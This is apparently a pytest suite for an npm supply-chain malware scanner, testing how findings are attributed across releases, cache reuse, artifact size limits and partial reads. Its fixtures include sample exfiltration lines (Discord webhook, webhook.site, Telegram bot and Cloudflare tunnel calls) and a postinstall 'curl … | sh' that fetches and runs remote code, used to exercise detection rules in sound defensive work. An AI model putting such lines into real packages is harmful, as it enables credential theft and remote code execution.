"""Stage 2 engine: new contents, attribution across a burst, and the content cache."""

import hashlib
import json
import shutil
from dataclasses import replace
from datetime import UTC, datetime, timedelta
from pathlib import Path

import httpx
import pytest

from conftest import Router, TarEntry, make_tar_gz, sri_sha512
from kitsunox.core.models import (
    ArtifactRef,
    Candidate,
    Change,
    Finding,
    PackageBatch,
    PackageVersionRef,
    PublishInfo,
    Severity,
    VersionSnapshot,
)
from kitsunox.core.run import STATIC_SNAPSHOT, DataDir
from kitsunox.ecosystems.npm.registry import NpmEcosystem
from kitsunox.ecosystems.npm.rules.artifact import RULES as NPM_ARTIFACT_RULES
from kitsunox.rules.static import RULES
from kitsunox.stages.ingest import write_jsonl
from kitsunox.stages.static import (
    MAX_ARTIFACT_BYTES,
    MAX_HOOK_ARTIFACT_BYTES,
    MAX_PARTIAL_ARTIFACT_BYTES,
    PARTIAL_POLICY,
    ArtifactFiles,
    ContentCache,
    Unavailable,
    analyse_batch,
    fetch_limit,
    has_hook,
    needs_retry,
    new_contents,
    partial_policy,
    read_mode,
    record_static,
    static_run,
    unhashed,
)
from kitsunox.util.archive import ArtifactTree, KeepPolicy, OmittedFile, stream_tar_gz
from kitsunox.util.http import FetchError, Snapshot, TransientFetchError
from kitsunox.util.partial import PARTIAL_CONTENT_TYPE

T0 = datetime(2026, 10, 1, tzinfo=UTC)
BASE = {"index.js": b"module.exports = 1", "README.md": b"hi"}
BAD = {
    "index.js": b"module.exports = 1",
    "lib/x.js": b"post('https://discord.com/api/webhooks/1093847562019384756/x')",
    "README.md": b"hi",
}
CLEAN = {"index.js": b"module.exports = 2", "README.md": b"hi"}


def snapshot(
    version: str, minutes: int = 0, size: int | None = 100, *, hook: str | None = None
) -> VersionSnapshot:
    return VersionSnapshot(
        ref=PackageVersionRef(ecosystem="npm", name="kx", version=version),
        publish=PublishInfo(published_at=T0 + timedelta(minutes=minutes)),
        manifest={"scripts": {hook: "node setup.js"}} if hook else {},
        artifact=ArtifactRef(
            url=f"https://r.test/kx-{version}.tgz", integrity="sha512-x", unpacked_size=size
        ),
    )


def candidate(version: str, minutes: int) -> Candidate:
    return Candidate(change=Change(new=snapshot(version, minutes)))


TREES = {"1.0.0": BASE, "1.0.1": BAD, "1.0.2": CLEAN}


def batch(base: VersionSnapshot | None = None) -> PackageBatch:
    return PackageBatch(
        ecosystem="npm",
        name="kx",
        base=base,
        versions=(candidate("1.0.1", 5), candidate("1.0.2", 10)),
    )


def test_new_contents_dedupes_and_keeps_first_version() -> None:
    items = list(new_contents(BASE, [("1.0.1", BAD), ("1.0.2", BAD | CLEAN)]))
    assert [(i.path, i.first_version) for i, _ in items] == [
        ("lib/x.js", "1.0.1"),
        ("index.js", "1.0.2"),
    ]
    assert len(list(new_contents(None, [("1", BASE)]))) == 2  # new package: everything is new


def test_reverted_payload_is_attributed_to_the_version_that_had_it(tmp_path: Path) -> None:
    result = analyse_batch(
        batch(snapshot("1.0.0")), lambda s: TREES[s.ref.version], ContentCache(tmp_path, RULES)
    )
    bad, clean = result.versions
    assert bad.history[-1].forwarded and bad.findings[0].evidence[0].path == "lib/x.js"
    assert not clean.history[-1].forwarded and clean.findings == ()
    assert clean.history[-1].reason == "no signal"


def test_unavailable_versions_and_base_are_explained(tmp_path: Path) -> None:
    def files(s: VersionSnapshot) -> dict[str, bytes] | Unavailable:
        return Unavailable(reason="gone") if s.ref.version != "1.0.2" else CLEAN

    result = analyse_batch(batch(snapshot("1.0.0")), files, ContentCache(None, RULES))
    bad, clean = result.versions
    assert bad.history[-1].reason == "files unavailable: gone; base unavailable: gone"
    assert not bad.history[-1].forwarded
    assert clean.history[-1].reason == "no signal; base unavailable: gone"


class FakeEcosystem:
    def __init__(self) -> None:
        self.fetched: list[str] = []

    def fetch_artifact(self, artifact: ArtifactRef) -> dict[str, bytes]:
        self.fetched.append(artifact.url)
        if "1.0.2" in artifact.url:
            raise FetchError("HTTP 404")
        if "1.0.3" in artifact.url:
            raise TransientFetchError("timed out")
        return BAD


def test_artifact_files_skips_oversize_and_reports_fetch_errors() -> None:
    ecosystem = FakeEcosystem()
    files = ArtifactFiles(ecosystem, max_bytes=1000)  # type: ignore[arg-type]
    assert files(snapshot("1.0.1")) == BAD
    assert files(snapshot("1.0.1", size=1001)) == Unavailable(
        reason="declared unpacked size 1001 bytes"
    )
    assert files(snapshot("1.0.2")) == Unavailable(reason="FetchError: HTTP 404")
    assert files(snapshot("1.0.3")) == Unavailable(
        reason="TransientFetchError: timed out", transient=True
    )
    no_artifact = snapshot("1.0.1").model_copy(update={"artifact": None})
    assert files(no_artifact) == Unavailable(reason="no artifact")
    assert len(ecosystem.fetched) == 3  # the oversize one was never downloaded


def test_a_version_with_an_install_hook_is_read_up_to_the_hook_limit() -> None:
    """32 MB declared instead of 16 for a version with an install hook (2026-11-08): the
    worm's large hooked follow-ons. `prepare` and `test` aren't install hooks."""
    assert MAX_HOOK_ARTIFACT_BYTES == 2 * MAX_ARTIFACT_BYTES
    ecosystem = FakeEcosystem()
    files = ArtifactFiles(ecosystem, max_bytes=1000, hook_max_bytes=2000)  # type: ignore[arg-type]
    for hook in ("preinstall", "install", "postinstall"):
        assert has_hook(snapshot("1.0.1", hook=hook))
        assert files(snapshot("1.0.1", size=2000, hook=hook)) == BAD
    assert not has_hook(snapshot("1.0.1", hook="prepare"))
    assert files(snapshot("1.0.1", size=1001, hook="prepare")) == Unavailable(
        reason="declared unpacked size 1001 bytes"
    )
    assert files(snapshot("1.0.1", size=2001, hook="postinstall")) == Unavailable(
        reason="declared unpacked size 2001 bytes"
    )
    assert len(ecosystem.fetched) == 3


def test_fetch_limit_never_lowers_the_cap_and_knows_only_its_ecosystems() -> None:
    hooked = snapshot("1.0.1", hook="postinstall")
    assert fetch_limit(snapshot("1.0.1")) == MAX_ARTIFACT_BYTES
    assert fetch_limit(hooked) == MAX_HOOK_ARTIFACT_BYTES
    assert fetch_limit(hooked, max_bytes=5000, hook_max_bytes=10) == 5000
    other = hooked.model_copy(update={"ref": hooked.ref.model_copy(update={"ecosystem": "pypi"})})
    assert not has_hook(other)
    assert fetch_limit(other) == MAX_ARTIFACT_BYTES


@pytest.mark.parametrize("base", [None, "1.0.0"])
def test_static_run_reads_batches_and_writes_results(tmp_path: Path, base: str | None) -> None:
    write_jsonl(tmp_path / "batches.jsonl", [batch(snapshot(base) if base else None)])
    (result,) = static_run(
        tmp_path, lambda s: TREES[s.ref.version], ContentCache(tmp_path / "cache", RULES)
    )
    assert [c.history[-1].forwarded for c in result.versions] == [True, False]
    assert PackageBatch.load_json((tmp_path / "static.jsonl").read_bytes()) == result


def test_cache_is_reused_and_keyed_by_rule_versions(tmp_path: Path) -> None:
    cache = ContentCache(tmp_path, RULES)
    first = cache.matches("ab" * 32, b"eval(x)")
    files = list(tmp_path.rglob("*.json"))
    assert len(files) == 1
    assert (
        cache.matches("ab" * 32, b"different bytes, same claimed hash") == first
    )  # served from disk
    assert ContentCache(tmp_path, RULES[:1]).dir != cache.dir


def test_damaged_cache_entry_is_recomputed(tmp_path: Path) -> None:
    cache = ContentCache(tmp_path, RULES)
    first = cache.matches("ab" * 32, b"eval(x)")
    (entry,) = tmp_path.rglob("*.json")
    entry.write_bytes(b'[{"ru\xf8le')
    assert cache.matches("ab" * 32, b"eval(x)") == first
    assert json.loads(entry.read_bytes())  # rewritten


def test_record_static_fetches_verifies_and_records(tmp_path: Path, router: Router) -> None:
    data = DataDir(tmp_path)
    tarball = make_tar_gz([TarEntry(f"package/{path}", content) for path, content in BAD.items()])
    good = snapshot("1.0.1").model_copy(
        update={
            "artifact": ArtifactRef(
                url="https://r.test/kx-1.0.1.tgz", integrity=sri_sha512(tarball)
            )
        }
    )
    router.add_bytes("https://r.test/kx-1.0.1.tgz", tarball)
    run_dir = data.run_dir("r1")
    write_jsonl(
        run_dir / "batches.jsonl",
        [
            PackageBatch(
                ecosystem="npm",
                name="kx",
                base=None,
                versions=(Candidate(change=Change(new=good)),),
            )
        ],
    )
    (result,) = record_static(data, "r1", NpmEcosystem, client=router.client())
    (version,) = result.versions
    assert version.history[-1].forwarded
    assert (run_dir / "static-snapshot.json").exists()
    assert (run_dir / "static.jsonl").exists()
    # A second pass is served from the immutable blob store, not the network.
    record_static(data, "r1", NpmEcosystem, client=router.client())
    assert router.requests == ["https://r.test/kx-1.0.1.tgz"]


def test_artifact_rules_see_each_available_version(tmp_path: Path) -> None:
    hidden = BAD | {"package.json": b'{"scripts": {"preinstall": "node x.js"}}'}
    trees: dict[str, dict[str, bytes] | Unavailable] = {
        "1.0.1": hidden,
        "1.0.2": Unavailable(reason="gone"),
    }
    result = analyse_batch(
        batch(),
        lambda s: trees[s.ref.version],
        ContentCache(None, RULES),
        artifact_rules=NPM_ARTIFACT_RULES,
    )
    bad, gone = result.versions
    assert "npm.artifact.hidden-install-script" in bad.history[-1].reason
    assert bad.findings[0].rule_id == "npm.artifact.hidden-install-script"  # artifact first
    assert gone.findings == ()


def test_network_failures_are_marked_for_retry() -> None:
    def files(s: VersionSnapshot) -> dict[str, bytes] | Unavailable:
        if s.ref.version == "1.0.0":
            return BASE
        return Unavailable(reason="TransientFetchError: x", transient=True)

    result = analyse_batch(batch(snapshot("1.0.0")), files, ContentCache(None, RULES))
    assert result.versions[0].history[-1].reason == (
        "files unavailable, will retry: TransientFetchError: x"
    )
    assert needs_retry([result])
    assert not needs_retry(
        [analyse_batch(batch(), lambda s: TREES[s.ref.version], ContentCache(None, RULES))]
    )


def test_a_match_the_previous_version_had_is_low_and_says_so(tmp_path: Path) -> None:
    """A changed file is matched whole: its old matches would fire again every release."""
    hook = b"post('https://discord.com/api/webhooks/1093847562019384756/x')\n"
    trees = {
        "1.0.0": {"lib/x.js": hook, "README.md": b"see https://webhook.site/abc"},
        "1.0.1": {
            "lib/x.js": hook + b"// a change elsewhere in the file\n",
            "README.md": b"see https://webhook.site/abc today",  # docs: never runs
            # new: stays HIGH
            "lib/new.js": b"fetch('https://webhook.site/0b1c2d3e-77bf-4ccb-8ba0-e5a652841e0a')",
        },
    }
    one = PackageBatch(
        ecosystem="npm", name="kx", base=snapshot("1.0.0"), versions=(candidate("1.0.1", 5),)
    )
    (result,) = analyse_batch(
        one, lambda s: trees[s.ref.version], ContentCache(tmp_path, RULES)
    ).versions
    by_path = {
        f.evidence[0].path: f for f in result.findings if f.rule_id == "static.exfil-endpoint"
    }
    assert by_path["lib/new.js"].severity is Severity.HIGH
    old = by_path["lib/x.js"]
    assert (old.severity, old.weight) == (Severity.LOW, 1.0)
    assert old.explanation.endswith("not new in this release.")
    docs = by_path["README.md"]
    assert docs.severity is Severity.LOW  # in the previous README too, and docs anyway
    fresh = {
        "1.0.0": {},
        "1.0.1": {
            "docs/guide.md": b"curl https://webhook.site/0b1c2d3e-77bf-4ccb-8ba0-e5a652841e0a"
        },
    }
    (only_docs,) = analyse_batch(
        one, lambda s: fresh[s.ref.version], ContentCache(tmp_path, RULES)
    ).versions
    (finding,) = only_docs.findings
    assert finding.severity is Severity.LOW and "doesn't run" in finding.explanation


def test_a_hashed_chunk_is_compared_with_the_base_chunk_of_the_same_name(tmp_path: Path) -> None:
    """`@camstack/addon-post-analysis` 1.2.654: the chunk's name changes with its content."""
    note = b"// a Quick tunnel's random `*.trycloudflare.com`\n"
    trees = {
        "1.0.0": {"dist/registry-BX6j2lnF.mjs": note, "dist/other-0HGmZj7D.mjs": b"1"},
        "1.0.1": {
            "dist/registry-CFQBxtE2.mjs": note + b"export const a = 2\n",
            # another chunk name
            "dist/other-9QmZk1Pa.mjs": b"fetch('https://calm-river-lake-one.trycloudflare.com')",
        },
    }
    one = PackageBatch(
        ecosystem="npm", name="kx", base=snapshot("1.0.0"), versions=(candidate("1.0.1", 5),)
    )
    (result,) = analyse_batch(
        one, lambda s: trees[s.ref.version], ContentCache(tmp_path, RULES)
    ).versions
    by_path = {
        f.evidence[0].path: f for f in result.findings if f.rule_id == "static.exfil-endpoint"
    }
    assert by_path["dist/registry-CFQBxtE2.mjs"].severity is Severity.LOW
    assert by_path["dist/other-9QmZk1Pa.mjs"].severity is Severity.HIGH


def test_every_base_chunk_of_a_name_is_compared(tmp_path: Path) -> None:
    """`@wirecat/*`: esbuild calls every chunk `chunk-<HASH>.js`; the bundled ngrok region table
    was in the base's sixth, and was HIGH again in each release."""
    base = {f"dist/chunk-{c}AAAAAA1.js": b"export const x = 1" for c in "ABCDE"}
    base["dist/chunk-FAAAAAA1.js"] = b'const regions = ["eu.ngrok.io"]'
    new = {"dist/chunk-ZZZZZZZ9.js": b'const regions = ["eu.ngrok.io"]; // moved'}
    trees = {"1.0.0": base, "1.0.1": new}
    one = PackageBatch(
        ecosystem="npm", name="kx", base=snapshot("1.0.0"), versions=(candidate("1.0.1", 5),)
    )
    (result,) = analyse_batch(
        one, lambda s: trees[s.ref.version], ContentCache(tmp_path, RULES)
    ).versions
    (found,) = [f for f in result.findings if f.rule_id == "static.exfil-endpoint"]
    assert found.severity is Severity.LOW


def test_a_new_file_is_compared_with_all_of_the_base_s_code(tmp_path: Path) -> None:
    """`@stacksjs/ts-cloud`: Bun names chunks `chunk-eevqxagd.js`, which `unhashed` can't tell
    from a word, so its Telegram notifier read as new in every release. A file with no
    counterpart is compared with what any base code file matched; one with a counterpart, and
    base docs, still don't count."""
    base = {
        "dist/bin/chunk-eevqxagd.js": b"fetch(`https://api.telegram.org/bot${t}/x?h=${hostname()}`)",
        "lib/index.js": b"export const x = 1",
        "README.md": b"Inspect requests at https://webhook.site/abc",
    }
    new = {
        "dist/bin/chunk-jcehsvnm.js": b"fetch(`https://api.telegram.org/bot${t}/x?h=${hostname()}`);",
        "lib/index.js": b"fetch(`https://api.telegram.org/bot${t}/getMe?h=${hostname()}`)",
        "dist/bin/chunk-qwertyui.js": b"post('https://webhook.site/0b1c2d3e-77bf-4ccb-8ba0-e5a652841e0a')",
    }
    trees = {"1.0.0": base, "1.0.1": new}
    one = PackageBatch(
        ecosystem="npm", name="kx", base=snapshot("1.0.0"), versions=(candidate("1.0.1", 5),)
    )
    (result,) = analyse_batch(
        one, lambda s: trees[s.ref.version], ContentCache(tmp_path, RULES)
    ).versions
    severity = {
        (f.evidence[0].path, f.explanation.split(".")[0]): f.severity
        for f in result.findings
        if f.rule_id == "static.exfil-endpoint"
    }
    assert severity == {
        ("dist/bin/chunk-jcehsvnm.js", "Found `api"): Severity.LOW,  # elsewhere in the base
        ("lib/index.js", "Found `api"): Severity.HIGH,  # new to its own counterpart
        ("dist/bin/chunk-qwertyui.js", "Found `webhook"): Severity.HIGH,  # only in base docs
    }


@pytest.mark.parametrize(
    ("path", "name"),
    [
        ("dist/clip-model-registry-BX6j2lnF.mjs", "dist/clip-model-registry.mjs"),
        ("static/js/main.3f2a9b1c.js", "static/js/main.js"),
        ("chunk-ABCD1234.cjs", "chunk.cjs"),
        # glimmervoid 0.48.x: Vite hashes without a digit, or with `-`
        ("dist/client/assets/settings-panel-Bkki_GMk.js", "dist/client/assets/settings-panel.js"),
        ("dist/client/assets/settings-panel-DPGhQMPB.js", "dist/client/assets/settings-panel.js"),
        ("dist/client/assets/settings-panel-CnQC9-zc.js", "dist/client/assets/settings-panel.js"),
        ("dist/editor-Markdown.js", None),
        ("dist/model-registry.js", None),  # a word, not a hash
        ("dist/a-BX6j2lnF.css", None),
        ("lib/index.js", None),
    ],
)
def test_unhashed(path: str, name: str | None) -> None:
    assert unhashed(path) == name


def test_any_rule_matching_only_in_a_file_that_never_runs_is_low(tmp_path: Path) -> None:
    """`@atairo/qixi` 0.1.3: an IP in a bundled dependency's README was MEDIUM."""
    trees = {
        "1.0.0": {},
        "1.0.1": {
            "node_modules/agent/README.md": b"proxy http://168.63.76.32:3128 here",
            "lib/x.js": b"get('http://168.63.76.32:3128/x')",
        },
    }
    one = PackageBatch(
        ecosystem="npm", name="kx", base=snapshot("1.0.0"), versions=(candidate("1.0.1", 5),)
    )
    (result,) = analyse_batch(
        one, lambda s: trees[s.ref.version], ContentCache(tmp_path, RULES)
    ).versions
    by_path = {f.evidence[0].path: f for f in result.findings if f.rule_id == "static.hardcoded-ip"}
    assert by_path["node_modules/agent/README.md"].severity is Severity.LOW
    assert by_path["lib/x.js"].severity is Severity.MEDIUM


def _ip_findings(tmp_path: Path, files: dict[str, bytes]) -> list[Finding]:
    one = PackageBatch(
        ecosystem="npm", name="kx", base=snapshot("1.0.0"), versions=(candidate("1.0.1", 5),)
    )
    (result,) = analyse_batch(
        one, lambda s: files if s.ref.version == "1.0.1" else {}, ContentCache(tmp_path, RULES)
    ).versions
    return [f for f in result.findings if f.rule_id == "static.hardcoded-ip"]


IP = b"http://45.33.32.156:8080/x"


def test_an_ip_in_data_or_tests_is_low(tmp_path: Path) -> None:
    """`static.hardcoded-ip` v3 (F4b): markup, tables, lockfiles, notices and `*.test.js`
    hold data; code and `.json` config (an app loads it) still count."""
    files = {
        "site/index.html": b"<a href='" + IP + b"'>x</a>",
        "data/hosts.csv": b"name,url\nx," + IP,
        "THIRD_PARTY_NOTICES.md.in": IP,
        "NOTICE": IP,
        "yarn.lock": IP,
        "lib/client.test.js": b"get('" + IP + b"')",
        "lib/x.js": b"fetch('" + IP + b"')",
        "config/app.json": b'{"api": "' + IP + b'"}',
    }
    found = {f.evidence[0].path: f for f in _ip_findings(tmp_path, files)}
    assert {p for p, f in found.items() if f.severity is Severity.MEDIUM} == {
        "lib/x.js",
        "config/app.json",
    }
    assert found["lib/client.test.js"].explanation.endswith("not code that runs.")


def test_a_context_note_does_not_make_an_old_match_new(tmp_path: Path) -> None:
    """Round 4 (`@stacksjs/ts-cloud@0.16.75`): the base's notifier chunk collected nothing, so
    its Telegram URL was LOW with v8's note; the new chunk also imports `child_process`, so
    the same URL is HIGH there. It is still the base's URL: LOW, not new."""
    url = b"fetch(`https://api.telegram.org/bot${t}/sendMessage`)"
    trees = {
        "1.0.0": {"dist/notify.js": url},
        "1.0.1": {"dist/notify.js": b"const cp = require('child_process');\n" + url},
    }
    one = PackageBatch(
        ecosystem="npm", name="kx", base=snapshot("1.0.0"), versions=(candidate("1.0.1", 5),)
    )
    (result,) = analyse_batch(
        one, lambda s: trees[s.ref.version], ContentCache(tmp_path, RULES)
    ).versions
    (finding,) = [f for f in result.findings if f.rule_id == "static.exfil-endpoint"]
    assert (finding.severity, finding.weight) == (Severity.LOW, 1.0)
    assert finding.explanation.endswith("not new in this release.")


def test_an_ip_in_package_json_metadata_is_low(tmp_path: Path) -> None:
    """F4b: `package.json`'s own repository, homepage and bugs URLs are metadata; the same URL
    in a hook's command, or any other field, still counts."""
    manifest = {
        "homepage": "http://45.33.32.156/home",
        "repository": {"type": "git", "url": "http://45.33.32.156/kx.git"},
        "config": {"url": "http://45.33.32.157/api"},
    }
    found = _ip_findings(tmp_path, {"package.json": json.dumps(manifest, indent=1).encode()})
    assert [(f.evidence[0].line_start, f.severity) for f in found] == [
        (2, Severity.LOW),
        (5, Severity.LOW),
        (8, Severity.MEDIUM),
    ]
    assert found[0].explanation.endswith("repository, homepage or bugs URL.")
    hooked = {
        "bugs": "http://45.33.32.156/i",
        "scripts": {"postinstall": "curl http://45.33.32.156/i"},
    }
    found = _ip_findings(tmp_path, {"package.json": json.dumps(hooked, indent=1).encode()})
    assert [f.severity for f in found] == [Severity.MEDIUM, Severity.MEDIUM]
    one_line = json.dumps({"homepage": "http://45.33.32.156/home"}).encode()
    (minified,) = _ip_findings(tmp_path, {"package.json": one_line})
    assert minified.severity is Severity.MEDIUM
    (broken,) = _ip_findings(tmp_path, {"package.json": b'{\n"homepage": "http://45.33.32.156/"\n'})
    assert broken.severity is Severity.MEDIUM
    elsewhere = {"lib/package.json": json.dumps(manifest, indent=1).encode()}
    assert {f.severity for f in _ip_findings(tmp_path, elsewhere)} == {Severity.MEDIUM}


def test_package_json_metadata_at_the_match_cap_stays(tmp_path: Path) -> None:
    """Three metadata URLs fill the rule's cap of matches; a fourth IP (a hook's) would go
    unseen, so none of them is taken for metadata then."""
    manifest = {
        "homepage": "http://45.33.32.156/a",
        "bugs": "http://45.33.32.156/b",
        "repository": "http://45.33.32.156/c",
        "scripts": {"postinstall": "curl http://45.33.32.158/p | sh"},
    }
    found = _ip_findings(tmp_path, {"package.json": json.dumps(manifest, indent=1).encode()})
    assert [f.severity for f in found] == [Severity.MEDIUM] * 3


TUNNEL = b"fetch('https://calm-river-lake-one.trycloudflare.com/x')"


def _exfil_by_path(tmp_path: Path, files: dict[str, bytes]) -> dict[str | None, Finding]:
    one = PackageBatch(
        ecosystem="npm", name="kx", base=snapshot("1.0.0"), versions=(candidate("1.0.1", 5),)
    )
    (result,) = analyse_batch(
        one, lambda s: files if s.ref.version == "1.0.1" else {}, ContentCache(tmp_path, RULES)
    ).versions
    return {f.evidence[0].path: f for f in result.findings if f.rule_id == "static.exfil-endpoint"}


def test_a_match_only_in_a_test_file_is_low(tmp_path: Path) -> None:
    """Round 5 (L5): tests, stories and mocks run under a test runner, not at install or load."""
    files = {
        "package.json": b'{"name": "kx", "main": "lib/index.js"}',
        "lib/index.js": TUNNEL,
        "src/adapter/chatPorts.test.ts": TUNNEL + b" // 1",
        "src/screens/Design.stories.tsx": TUNNEL + b" // 2",
        "lib/__mocks__/net.js": TUNNEL + b" // 3",
        "py/test_client.py": TUNNEL + b" // 4",
    }
    found = _exfil_by_path(tmp_path, files)
    assert found["lib/index.js"].severity is Severity.HIGH
    for path in set(files) - {"package.json", "lib/index.js"}:
        assert found[path].severity is Severity.LOW, path
        assert "Only in a test file" in found[path].explanation


def test_a_test_or_docs_file_the_package_loads_is_not_taken_for_one(tmp_path: Path) -> None:
    """A file an install hook runs or the entry point loads keeps its findings, whatever its
    name: payloads hide in `test/`."""
    files = {
        "package.json": (
            b'{"name": "kx", "main": "index.js", "scripts": {"postinstall": "node test/setup.js"}}'
        ),
        "index.js": b"require('./lib/util.spec.js')",
        "lib/util.spec.js": TUNNEL,
        "test/setup.js": TUNNEL + b" // 1",
        "test/other.js": TUNNEL + b" // 2",
    }
    found = _exfil_by_path(tmp_path, files)
    assert found["lib/util.spec.js"].severity is Severity.HIGH
    assert found["test/setup.js"].severity is Severity.HIGH
    assert found["test/other.js"].severity is Severity.LOW


# Round 9 (S2): each version's matches are judged against its own previous release.
BAD_REBUILT = BAD | {
    "lib/x.js": b"post('https://discord.com/api/webhooks/1093847562019384756/y') // rebuilt"
}


def chained(*versions: tuple[str, str | None]) -> tuple[Candidate, ...]:
    """Candidates whose `previous` is the named version (None: a new package)."""
    return tuple(
        Candidate(
            change=Change(
                new=snapshot(version, i), previous=snapshot(previous) if previous else None
            )
        )
        for i, (version, previous) in enumerate(versions)
    )


def chain_batch(base: str | None, *versions: tuple[str, str | None]) -> PackageBatch:
    return PackageBatch(
        ecosystem="npm",
        name="kx",
        base=snapshot(base) if base else None,
        versions=chained(*versions),
    )


def test_a_later_version_is_compared_with_its_own_previous_release() -> None:
    """`@blod-nm/nuxt-mcp@0.1.7` (live, 2026-11-12) rebuilt 0.1.6's obfuscated files in the same
    run: compared with the batch's base, which had none, it was MEDIUM again."""
    trees = {"1.0.0": BASE, "1.0.1": BAD, "1.0.2": BAD_REBUILT}
    result = analyse_batch(
        chain_batch("1.0.0", ("1.0.1", "1.0.0"), ("1.0.2", "1.0.1")),
        lambda s: trees[s.ref.version],
        ContentCache(None, RULES),
    )
    first, rebuilt = result.versions
    assert first.history[-1].forwarded
    assert not rebuilt.history[-1].forwarded and rebuilt.history[-1].reason == "no signal"
    assert {f.severity for f in rebuilt.findings} == {Severity.LOW}
    assert all(f.explanation.endswith("not new in this release.") for f in rebuilt.findings)


def test_a_match_new_against_the_own_previous_release_stays() -> None:
    """A clean release in the batch, then one that adds the match: still flagged, even though
    the batch's base had it (an injected payload after a clean-up)."""
    trees = {"1.0.0": BAD, "1.0.1": CLEAN, "1.0.2": BAD_REBUILT}
    result = analyse_batch(
        chain_batch("1.0.0", ("1.0.1", "1.0.0"), ("1.0.2", "1.0.1")),
        lambda s: trees[s.ref.version],
        ContentCache(None, RULES),
    )
    assert result.versions[1].history[-1].forwarded


def test_a_previous_release_outside_the_batch_is_read() -> None:
    """Two release lines in one run (`@aglit-ai/cli` `1.0.x-staging` beside `5.0.x-runtime`):
    the batch's base is the other line's release, the version's own previous is not in the
    batch. Unavailable, the base is used and the reason says so."""
    trees: dict[str, dict[str, bytes] | Unavailable] = {
        "5.0.0": Unavailable(reason="declared unpacked size 67109197 bytes"),
        "1.0.4": BAD,
        "1.0.5": BAD_REBUILT,
        "5.0.1": CLEAN,
    }
    read: list[str] = []

    def files(s: VersionSnapshot) -> dict[str, bytes] | Unavailable:
        read.append(s.ref.version)
        return trees[s.ref.version]

    lines = chain_batch("5.0.0", ("1.0.5", "1.0.4"), ("5.0.1", "5.0.0"))
    staging, _ = analyse_batch(lines, files, ContentCache(None, RULES)).versions
    assert not staging.history[-1].forwarded
    assert staging.history[-1].reason.startswith("no signal; base unavailable: declared")
    assert read == ["5.0.0", "1.0.5", "1.0.4", "5.0.1"]
    trees["1.0.4"] = Unavailable(reason="TransientFetchError: x", transient=True)
    staging, _ = analyse_batch(lines, files, ContentCache(None, RULES)).versions
    assert staging.history[-1].forwarded
    assert staging.history[-1].reason.endswith(
        "; previous 1.0.4 unavailable, will retry: TransientFetchError: x"
    )
    assert needs_retry([PackageBatch(ecosystem="npm", name="kx", base=None, versions=(staging,))])


def test_a_new_package_burst_compares_later_versions_with_earlier_ones() -> None:
    """No base (a new package), but the second version's previous is the first: its rebuilt
    match is not new (`@blod-nm/ak@0.1.1` after `0.1.0` in one run)."""
    trees = {"0.1.0": BAD, "0.1.1": BAD_REBUILT}
    result = analyse_batch(
        chain_batch(None, ("0.1.0", None), ("0.1.1", "0.1.0")),
        lambda s: trees[s.ref.version],
        ContentCache(None, RULES),
    )
    first, second = result.versions
    assert first.history[-1].forwarded and not second.history[-1].forwarded


# --- partial reads (decision 0021) --------------------------------------------------------------


class FakePartialEcosystem(FakeEcosystem):
    def __init__(self) -> None:
        super().__init__()
        self.partial: list[str] = []

    def fetch_artifact_partial(self, artifact: ArtifactRef, policy: KeepPolicy) -> ArtifactTree:
        self.partial.append(artifact.url)
        assert policy.version == PARTIAL_POLICY.version
        assert policy.rank("setup.js", b"") == 0  # the hook's script (`snapshot(hook=...)`)
        return ArtifactTree(files=CLEAN)


def test_a_hooked_version_over_its_limit_is_read_partially_up_to_the_ceiling() -> None:
    ecosystem = FakePartialEcosystem()
    files = ArtifactFiles(
        ecosystem,  # type: ignore[arg-type]
        max_bytes=1000,
        hook_max_bytes=2000,
        partial_max_bytes=5000,
    )
    assert files(snapshot("1.0.1", size=2000, hook="postinstall")) == BAD  # whole
    assert files(snapshot("1.0.1", size=5000, hook="postinstall")) == ArtifactTree(files=CLEAN)
    assert files(snapshot("1.0.1", size=5001, hook="postinstall")) == Unavailable(
        reason="declared unpacked size 5001 bytes"
    )
    assert files(snapshot("1.0.1", size=1001)) == Unavailable(  # no hook: as before
        reason="declared unpacked size 1001 bytes"
    )
    assert len(ecosystem.fetched) == 1
    assert ecosystem.partial == ["https://r.test/kx-1.0.1.tgz"]


def test_read_mode_depends_on_the_metadata_only() -> None:
    hooked = MAX_HOOK_ARTIFACT_BYTES
    assert read_mode(snapshot("1.0.1", size=None, hook="install")) == "whole"
    assert read_mode(snapshot("1.0.1", size=hooked, hook="install")) == "whole"
    assert read_mode(snapshot("1.0.1", size=hooked + 1, hook="install")) == "partial"
    ceiling = MAX_PARTIAL_ARTIFACT_BYTES
    assert read_mode(snapshot("1.0.1", size=ceiling, hook="install")) == "partial"
    assert read_mode(snapshot("1.0.1", size=ceiling + 1, hook="install")) is None
    assert read_mode(snapshot("1.0.1", size=MAX_ARTIFACT_BYTES + 1)) is None


@pytest.mark.parametrize(
    ("path", "rank"),
    [
        ("package.json", 0),
        ("build/binding.gyp", 0),
        ("assets/font.woff2", 0),  # text under a binary format's name: a disguise candidate
        ("install.js", 1),
        ("lib/index.mjs", 1),
        ("scripts/setup.sh", 1),
        ("node_modules/dep/index.js", 2),
        ("config.json", 2),
        ("index.d.ts", 3),
        ("dist/index.js.map", 3),
        ("README.md", 3),
        ("test/index.js", 3),
        ("styles.css", 3),
    ],
)
def test_what_a_partial_read_keeps_first(path: str, rank: int) -> None:
    assert PARTIAL_POLICY.rank(path, b"") == rank


def test_source_files_are_always_text() -> None:
    assert PARTIAL_POLICY.text("a/b.JS") and PARTIAL_POLICY.text("binding.gyp")
    assert not PARTIAL_POLICY.text("a.node") and not PARTIAL_POLICY.text("Makefile")


def test_a_partial_read_says_what_it_did_not_read() -> None:
    omitted = (
        OmittedFile(
            path="bin/x.node", size=40_000_000, sha256="ab" * 32, mode=0o755, reason="binary"
        ),
        OmittedFile(
            path="dist/big.js", size=20_000_000, sha256="cd" * 32, mode=0o644, reason="file"
        ),
    )
    tree = ArtifactTree(files=BAD, omitted=omitted)
    result = analyse_batch(
        batch(),
        lambda s: tree if s.ref.version == "1.0.1" else CLEAN,
        ContentCache(None, RULES),
        artifact_rules=NPM_ARTIFACT_RULES,
    )
    bad, clean = result.versions
    assert bad.history[-1].reason.endswith("; partial read: 2 files (60.0 MB) not read")
    (partial,) = [f for f in bad.findings if f.rule_id == "static.partial-read"]
    assert partial.severity is Severity.INFO and partial.weight == 0
    assert "1 binary, 1 over the per-file limit" in partial.explanation
    assert [e.path for e in partial.evidence] == ["bin/x.node", "dist/big.js"]
    assert "partial read" not in clean.history[-1].reason
    assert not any(f.rule_id == "static.partial-read" for f in clean.findings)


HOOKED = b'{"name":"kx","scripts":{"postinstall":"node setup.js"}}'
# A large "platform binary" that compresses well (the test stays fast) but has a NUL byte.
